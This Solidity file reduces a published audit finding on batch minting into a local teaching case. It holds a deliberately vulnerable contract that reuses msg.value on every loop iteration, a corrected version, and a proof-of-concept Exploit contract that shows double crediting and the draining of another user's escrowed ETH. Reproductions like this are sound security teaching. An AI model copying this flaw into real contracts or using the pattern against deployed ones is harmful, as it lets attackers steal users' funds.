// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Sofamon GachaMachine — msg.value reused inside batchCommitToMint
    (Pashov Audit Group, H-02, August 2024).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: batchCommitToMint calls commitToMint in a loop. commitToMint
    transfers msg.value on every iteration, and an internal call still sees the
    original batch payment. One 1 ETH batch is forwarded twice, so the caller
    is credited two tickets and the next user's escrowed ETH is swept with it.
    Vulnerable line preserved verbatim below (@> VULN). */

contract FeeSink {
    receive() external payable {}
}

contract GachaMachine {
    struct MintData {
        uint256 collectionId;
        uint256 spins;
        address minter;
    }

    address public commitController;
    address public protocolFeeTo;
    uint256 public nextTicket;
    uint256 public accounted;
    mapping(address => uint256) public credits;
    mapping(address => uint256) public escrowOf;

    error NotApproved();

    event MintCommited(address indexed caller, address indexed minter, uint256 spins, uint256 value, uint256 ticketNonce);

    constructor(address feeTo) {
        protocolFeeTo = feeTo;
    }

    function setController(address controller) external {
        commitController = controller;
    }

    function escrowFor(address user) external payable {
        uint256 updated = escrowOf[user] + msg.value;
        escrowOf[user] = updated;
    }

    /// @dev Note, this function should only be called by the commitController, otherwise it will fail with no signature
    /// @param mintData An array of all the spins to spin for
    /// @return ticketNonces The nonces for each spin so that the user can claim their rewards
    function batchCommitToMint(MintData[] calldata mintData) public payable returns (uint256[] memory ticketNonces) {
        ticketNonces = new uint256[](mintData.length);

        for (uint256 i; i < mintData.length;) {
            MintData memory data = mintData[i];

            uint256 nonce = commitToMint(data.collectionId, data.spins, data.minter, "");
            ticketNonces[i] = nonce;

            unchecked {
                ++i;
            }
        }
    }

    /// @param _collectionId The Id of the collection you wish to roll for
    /// @param spins The amount of spins you wish to roll
    /// @param signature A signature commit to the price, nonce, and minter from the authority address
    ///
    /// @return ticketNonce The nonce to use to claim your mint
    function commitToMint(uint256 _collectionId, uint256 spins, address minter, bytes memory signature)
        public
        payable
        returns (uint256 ticketNonce)
    {
        if (msg.sender != commitController) {
            if (signature.length == 0 || _collectionId == type(uint256).max) revert NotApproved();
        }

        if (msg.value != 0) {
            // @> VULN: msg.value is the whole batch payment and is transferred again on every iteration
            payable(protocolFeeTo).transfer(msg.value);
            accounted += msg.value;
        }

        ticketNonce = ++nextTicket;
        credits[minter] += spins;

        emit MintCommited(msg.sender, minter, spins, msg.value, ticketNonce);
    }
}

contract GachaMachineFixed {
    struct MintData {
        uint256 collectionId;
        uint256 spins;
        address minter;
    }

    uint256 public constant UNIT = 1 ether;

    address public commitController;
    address public protocolFeeTo;
    uint256 public nextTicket;
    uint256 public accounted;
    mapping(address => uint256) public credits;
    mapping(address => uint256) public escrowOf;

    constructor(address feeTo) {
        protocolFeeTo = feeTo;
    }

    function setController(address controller) external {
        commitController = controller;
    }

    function escrowFor(address user) external payable {
        escrowOf[user] += msg.value;
    }

    function batchCommitToMint(MintData[] calldata mintData) public payable returns (uint256[] memory ticketNonces) {
        ticketNonces = new uint256[](mintData.length);
        uint256 budget = msg.value;

        for (uint256 i; i < mintData.length;) {
            MintData memory data = mintData[i];
            uint256 cost = data.spins * UNIT;
            if (budget < cost) break;
            budget -= cost;
            credits[data.minter] += data.spins;
            ticketNonces[i] = ++nextTicket;
            unchecked {
                ++i;
            }
        }

        uint256 spent = msg.value - budget;
        if (spent != 0) {
            payable(protocolFeeTo).transfer(spent);
            accounted += spent;
        }
    }
}

contract Exploit {
    address public constant VICTIM = 0x2222222222222222222222222222222222222222;

    FeeSink public fee; // CREATE nonce 1
    GachaMachine public machine; // CREATE nonce 2

    constructor() {
        fee = new FeeSink();
        machine = new GachaMachine(address(fee));
        machine.setController(address(this));
    }

    function run() external payable {
        machine.escrowFor{value: 1 ether}(VICTIM);
        uint256 escrowed = machine.escrowOf(VICTIM);

        GachaMachine.MintData[] memory rows = new GachaMachine.MintData[](2);
        rows[0] = GachaMachine.MintData({collectionId: 1, spins: 1, minter: address(this)});
        rows[1] = GachaMachine.MintData({collectionId: 1, spins: 1, minter: address(this)});

        machine.batchCommitToMint{value: 1 ether}(rows);

        uint256 credited = machine.credits(address(this));
        uint256 feeTaken = address(fee).balance;
        uint256 leftInMachine = address(machine).balance;
        uint256 doubleCounted = machine.accounted();

        require(escrowed == 1 ether, "escrow");
        require(credited == 2, "two credits");
        require(feeTaken == 2 ether, "fee took two payments");
        require(leftInMachine == 0, "victim escrow swept");
        require(doubleCounted == 2 ether, "msg.value counted twice");
    }
}
